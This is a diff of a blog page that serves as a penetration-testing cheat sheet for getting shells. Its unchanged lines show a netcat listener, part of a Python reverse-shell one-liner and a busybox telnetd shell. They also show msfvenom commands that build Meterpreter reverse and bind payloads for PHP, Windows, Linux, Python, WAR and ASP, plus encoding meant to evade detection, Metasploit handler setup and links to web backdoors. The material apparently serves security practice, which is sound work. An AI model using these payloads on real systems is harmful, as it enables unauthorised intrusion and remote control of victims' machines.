@@ -1,16 +1,16 @@
 ---
-id: 2017-12-17-guide-to-all-types-of-shells-that-you-might-need
+id: 2023-01-11-guide-to-all-types-of-shells-that-you-might-need
 title: guide to all types of shells that you might need
 metaTitle: Guide To All Types Of Shells That You Might Need | Anas's Digital Garden
 metaDescription: guide to all types of shells that you might need | Anas's Digital Garden
-createdDate: 2017-12-17
-updatedDate: 2023-01-15
+createdDate: 2023-01-11
+updatedDate: 2023-01-18
 weekNumber: 202302
 category: security
-tags: ["security", "reverse-shells", "guide-to-all-types-of-shells-that-you-might-need"]
+tags: ["security", "guide-to-all-types-of-shells-that-you-might-need"]
 ---
 
-# Shells (Guide to all types of shells that you might need)
+# Shells (Guide to All Types of Shells that You Might need)
 
 ## Netcat Shell Listener
 
@@ -18,7 +18,7 @@ tags: ["security", "reverse-shells", "guide-to-all-types-of-shells-that-you-migh
   nc -nlvp 4444
 ```
 
-## Spawning a TTY Shell - Break out of Jail or limited shell
+## Spawning a Tty Shell - Break out of Jail or Limited Shell
 
 You should almost always upgrade your shell after taking control of an apache or www user.
 
@@ -26,7 +26,7 @@ You should almost always upgrade your shell after taking control of an apache or
 
 (hint: sudo -l to see what you can run)
 
-- You may encounter limited shells that use rshell-session and only allow you to execute a single command per session.
+- You may encounter limited shells that use rshell-session and only allow you to execute a single command per session.  
   You can overcome this by executing an SSH shell to your localhost:
 
 ```shell
@@ -107,7 +107,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
   /bin/busybox telnetd -|/bin/sh -p9999
 ```
 
-## Creating Meterpreter Shells with MSFVenom
+## Creating Meterpreter Shells with Msfvenom
 
 ### [most-useful-msfvenom-payloads](http://www.securityunlocked.com/2016/01/02/network-security-pentesting/most-useful-msfvenom-payloads/)
 
@@ -182,7 +182,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port 
 
 ### Shellcode
 
-For all shellcode see 'msfvenom -help-formats' for information as to valid parameters. Msfvenom will output code that is
+For all shellcode see 'msfvenom -help-formats' for information as to valid parameters. Msfvenom will output code that is  
 able to be cut and pasted in this language for your exploits.
 
 - _Linux Based Shellcode_
@@ -205,7 +205,7 @@ able to be cut and pasted in this language for your exploits.
 
 ## Handlers
 
-Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells.
+Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells.  
 Handlers should be in the following format.
 
 ```shell
@@ -219,7 +219,7 @@ Handlers should be in the following format.
 
 Once the required values are completed the following command will execute your handler - `msfconsole -L -r`
 
-- SSH to
+- SSH to  
   Meterpreter: [got-ssh-creds-want-meterpreter-try-this](https://daemonchild.com/2015/08/10/got-ssh-creds-want-meterpreter-try-this/)
 
 ```shell
@@ -229,16 +229,15 @@ Once the required values are completed the following command will execute your h
 
 - SBD.exe
 
-  sbd is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and
-  on Microsoft Win32. sbd features AES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution (-e
-  option), choosing source port, continuous reconnection with delay, and some other nice features. sbd supports TCP/IP
+  sbd is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and  
+  on Microsoft Win32. sbd features AES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution (-e  
+  option), choosing source port, continuous reconnection with delay, and some other nice features. sbd supports TCP/IP  
   communication only.
 
-  sbd.exe (part of the Kali linux distribution: /usr/share/windows-binaries/backdoors/sbd.exe) can be uploaded to a
+  sbd.exe (part of the Kali linux distribution: /usr/share/windows-binaries/backdoors/sbd.exe) can be uploaded to a  
   windows box as a Netcat alternative.
 
 - Shellshock
-
   - Testing for shell shock with NMap
 
     ```shell
@@ -274,7 +273,7 @@ Once the required values are completed the following command will execute your h
 
 ## Reverse Shell with Msfvenom
 
-### List payloads
+### List Payloads
 
 ```shell
 msfvenom -l
@@ -286,65 +285,65 @@ Or
 msfvenom --list payloads
 ```
 
-### Generate a PHP payload
+### Generate a Php Payload
 
 ```shell
 msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
 ```
 
-### Generate a Windows payload
+### Generate a Windows Payload
 
-#### Meterpreter - Reverse shell (x64):
+#### Meterpreter - Reverse Shell (x64)
 
 ```shell
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > reverse.exe
 ```
 
-#### Meterpreter - Reverse shell:
+#### Meterpreter - Reverse Shell
 
 ```shell
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=<Attacker_PORT> -f exe > reverse.exe
 ```
 
-##### Meterpreter - Bind shell:
+##### Meterpreter - Bind Shell
 
 ```shell
 msfvenom -p windows/meterpreter/bind_tcp RHOST=<Target_IP> LPORT=<Target_Port> -f exe > bind.exe
 ```
 
-##### CMD - Reverse shell:
+##### Cmd - Reverse Shell
 
 ```shell
 msfvenom -p windows/shell/reverse_tcp LHOST=<Attacker_IP> LPORT=<Attacker_port> -f exe > prompt.exe
 ```
 
-### Generate a Linux payload
+### Generate a Linux Payload
 
-#### Meterpreter - Reverse shell:
+#### Meterpreter - Reverse Shell
 
 ```shell
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=<Attacker_port> -f elf > reverse_bin
 ```
 
-### Generate a Python payload
+### Generate a Python Payload
 
 ```shell
 msfvenom -p cmd/unix/reverse_python LHOST=<Attacker_IP> LPORT=<Attacker_port> -f raw > reverse.py
 ```
 
-### Generate a WAR payload
+### Generate a War Payload
 
 ```shell
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Attacker_IP> LPORT=<Attacker_port> -f war > payload.war
 ```
 
-### Generate an ASP payload
+### Generate an Asp Payload
 
 ```shell
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=<Attacker_PORT> -f asp > reverse.asp
 ```
 
-### Generate encoded payloads
+### Generate Encoded Payloads
 
 #### Shikata_ga_nai
 
@@ -352,18 +351,18 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=<Attacker_
 msfvenom -p <PAYLOAD> -e shikata_ga_nai -i 5 -f raw > reverse
 ```
 
-## Tools and useful links
+## Tools and Useful Links
 
 - [Pen test monkey PHP reverse shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
 - [php-findsock-shell](http://pentestmonkey.net/tools/web-shells/php-findsock-shell) - turns PHP port 80 into an
 
-###  interactive shell
+### Interactive Shell
 
 - [Perl Reverse Shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell)
 - [PHP powered web browser Shell b374k with file upload etc.](https://github.com/b374k/b374k)
 - [Windows reverse shell](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1)
 
-### PowerSploit's Invoke-Shellcode script and inject a Meterpreter shell
+### Powersploit's Invoke-shellcode Script and Inject a Meterpreter Shell
 
 - [Web Backdoors from Fuzzdb](https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors)
 
